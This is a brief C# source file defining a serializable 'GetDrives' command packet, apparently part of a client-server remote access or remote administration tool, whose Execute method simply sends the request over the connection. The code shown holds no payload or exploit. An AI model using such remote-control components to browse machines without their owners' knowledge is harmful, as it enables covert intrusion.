using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetDrives : IPacket
    {
        public GetDrives()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}